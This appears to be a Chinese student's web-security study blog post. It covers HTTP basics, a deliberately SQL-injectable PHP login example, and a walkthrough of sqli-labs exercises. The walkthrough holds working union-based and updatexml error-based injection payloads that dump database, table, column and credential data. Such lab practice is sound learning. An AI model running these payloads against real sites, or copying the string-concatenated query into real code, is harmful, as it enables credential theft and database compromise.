---
title: web方向任务
date: 2025-10-12 17:53:28
keywords: 网络安全入门
tags: web入门
---
# web任务

## 任务1——http协议
### 几种请求方式
> 以下是几种请求方式的详细说明
  - get    从服务器读取或查询指定资源,请求参数跟url后面
  - post   向服务器提交参数，参数在请求体里面
  - put    更新服务器上的资源，参数在请求体里面
  - delete 删除服务器上的资源
  - head   只返回响应头，不返回响应体
  - patch  对资源进行部分更新，参数在请求体里面
### 请求头和响应头
> 请求头和响应头是http协议的一部分，用于在客户端和服务器之间传递信息。
  - 请求头：客户端向服务器发送请求时，包含在请求中的一些信息，如请求方法、请求url、请求协议版本、请求头字段等。(比如告诉服务器客户端使用的是什么浏览器、客户端的ip地址、客户端支持的协议版本等)
  - 响应头：服务器向客户端发送响应时，包含在响应中的一些信息，如响应状态码、响应协议版本、响应头字段等。
  前者是客户端向服务器发送请求时包含的信息
  后者是服务器向客户端发送响应时包含的信息。
### 状态码
> 状态码是服务器向客户端发送响应时包含的一个三位数字，用于表示请求的处理结果。
  - 1xx：信息性状态码，用于表示请求已被接收，继续处理。
  - 2xx：成功状态码，用于表示请求已成功被服务器接收、理解和处理。
  - 3xx：重定向状态码，用于表示请求的资源已被移动到其他位置，需要客户端重新发起请求。(301永久重定向、302临时重定向)
  - 4xx：客户端错误状态码，用于表示客户端请求包含错误或无法完成。
  - 5xx：服务器错误状态码，用于表示服务器在处理请求时发生错误。
### 报文分析
> POST /api/graphs/fulltext-search?haha=123 HTTP/1.1
  请求方式是post 查询参数haha=123 协议版本1.1
> Host: localhost:本地主机
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWe(KHTML,
  like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
  edge浏览器，chrome
> Sec-Ch-Ua-Mobile: ?0 表示不是移动设备
  Accept: text/html 客户端接收text/html的响应
  Referer: https://osgraph.com/  客户端从osgraph.com发起请求
  Accept-Encoding: gzip, deflate, br 接受的压缩编码格式
  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6  客户端支持的语言，中文优先，其次是英文
  Connection: close  客户端请求完成后关闭连接
  Content-Type: application/x-www-form-urlencoded  客户端发送的请求体是url编码格式
  Content-Length: 26  请求体的长度是26字节
> 请求体indexName=github&keyword=1  客户端向服务器提交的数据

## 任务二——语言基础
### php
> 题目代码<?php
  // login.php
  // 纯 PHP 登录示例，使用单独文件的数据库连接
  // 引入数据库连接
  require 'db.php';
  // 模拟接收表单数据（CLI 或 Web POST）
  if (php_sapi_name() === 'cli') {
    echo "请输入用户名: ";
    $username = trim(fgets(STDIN));
    echo "请输入密码: ";
    $password = trim(fgets(STDIN));
  } else {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
  }
  // 检查输入
  if ($username === "" || $password === "") {
    echo "用户名和密码不能为空\n";
    exit;
  }
  // 查询数据库（明文密码示例）
    $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = $conn->query($sql);
  if ($result && $result->num_rows > 0) {
    echo "登录成功！欢迎你，$username\n";
  } else {
    echo "用户名或密码错误\n";
  }
  // 关闭数据库
  $conn->close();
> db.php
  CREATE DATABASE test;
  USE test;
  CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50)
  );
  INSERT INTO users (username, password) VALUES ('alice', '12345');
  INSERT INTO users (username, password) VALUES ('bob', 'abcde');
dp.php主要是创建数据库和表，插入数据，并存了账号和密码
上面的代码主要是登录功能的实现，包括接收表单数据、检查输入、查询数据库、返回登录结果等。然后在查询数据库那里会被sql注入，因为直接将用户输入的用户名和密码拼接到sql语句中，没有对用户输入进行过滤和转义。
### html
> <!-- login.html -->
  <!doctype html>
  <html>
  <head><meta charset="utf-8"><title>Login</title></head>
  <body>
   <h3>登录</h3>
   <form action="/login.php" method="post">
   <label>用户名: <input type="text" name="username" /></label><br>
   <label>密码: <input type="password" name="password" /></label><br>
   <button type="submit">登录</button>
   </form>
  </body>
  </html>
  <!-- upload.html -->
  <!doctype html>
  <html>
  <body>
   <h3>上传文件</h3>
   <form action="/upload.php" method="post" enctype="multipart/form-data">
   <input type="file" name="file" />
   <button type="submit">上传</button>
   </form>
  </body>
  </html>

包含两个独立HTML表单的文件,分别是登录表单和文件上传表单.
![登录(上传)表单](/img/jietu_login.png)

## 任务3——sql注入
> less 1
?id=2-1 和 id=2 一样说明是字符型,通过id=1'和id=1"判断出是单引号闭合
![jietu_lee1-1](/img/jietu_lee1-1.png)
用order by和group by可以判断行数，这里三行没有报错但是四抱错了，说明是3行
![jietu_lee1-2](/img/jietu_lee1-2.png)
![jietu_lee1-3](/img/jietu_lee1-3.png)
然后用 ?id=-1' union select 1,2,3 --+判断回显位，注意这里的id=-1或者其他不存在的数。这里我就省略了照片了
然后?id=-1' union select 1,2,(database()) --+爆出数据库名security
![jietu_lee1-4](/img/jietu_lee1-4.png)
然后?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='security' --+ 这里的tables记得s别忘了,得到表名
![jietu_lee1-5](/img/jietu_lee1-5.png)
然后?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users' --+ 得到列名
![jietu_lee1-6](/img/jietu_lee1-6.png)
最后?id=-1' union select 1,2,group_concat(username,'-',password)from users --+ 得到用户名和密码
![jietu_lee1-7](/img/jietu_lee1-7.png)
只能说没有waf还是很容易的

> less5 报错注入
还是判断类型和闭合，单引号和字符型
![jietu_lee5-1](/img/jietu_lee5-1.png)
用order by判断回显位，这里是3
然后联合查询无回显，尝试报错注入(extractvalue通过修改查询路径的斜杠为波浪产生报错)
?id=1' and updatexml(1,concat(1,(select database())),1) --+ 得到数据库secutity
![jietu_lee5-2](/img/jietu_lee5-2.png)
?id=1' and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1) --+ 得到表名
![jietu_lee5-3](/img/jietu_lee5-3.png)
?id=1' and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),1) --+ 得到字段名
![jietu_lee5-4](/img/jietu_lee5-4.png)
?id=1' and updatexml(1,concat(1,(select group_concat(username,'-'
password) from users)),1) --+ 得到用户名和密码
![jietu_lee5-5](/img/jietu_lee5-5.png)

>less-11 这个我之前还真没练过
在用户名框输入 admin' and 1=1 -- a 判断是单引号闭合
admin' order by 2 -- a 列数为2
![jietu_less11-1](/img/jietu_less11-1.png)
然后他不给我回显我在思考是不是类似布尔盲注，后面看wp要抓包，那就bp一下
![jietu_less11-2](/img/jietu_less11-2.png)
奇怪了，抓包也一样的，好吧那这道题就到这里了，奇怪
![jietu_less11-3](/img/jietu_less11-2.png)

### 响应码
#### 常见HTTP状态码分类及核心含义表
| 状态码范围 | 类别                | 核心含义                     | 典型状态码及用途                                                                 |
|------------|---------------------|------------------------------|----------------------------------------------------------------------------------|
| 1xx        | 信息性响应          | 服务器已接收请求，需进一步处理 | 100 Continue：告知客户端可继续发送请求体；101 Switching Protocols：协议切换（如HTTP转WebSocket） |
| 2xx        | 成功响应            | 请求已成功处理               | 200 OK：请求正常完成；201 Created：资源创建成功（如POST提交表单）；204 No Content：成功但无返回内容 |
| 3xx        | 重定向响应          | 需客户端进一步操作才能完成请求 | 301 永久重定向：资源已迁移至新地址；302 临时重定向：资源临时跳转；304 Not Modified：资源未修改，从缓存加载 |
| 4xx        | 客户端错误          | 请求存在错误，服务器无法处理 | 400 Bad Request：请求参数无效；401 Unauthorized：需身份验证；403 Forbidden：访问被拒绝；404 Not Found：资源不存在 |
| 5xx        | 服务器错误          | 服务器处理请求时发生故障     | 500 Internal Server Error：服务器内部错误；502 Bad Gateway：网关错误；503 Service Unavailable：服务器暂时不可用；504 Gateway Timeout：网关超时 |
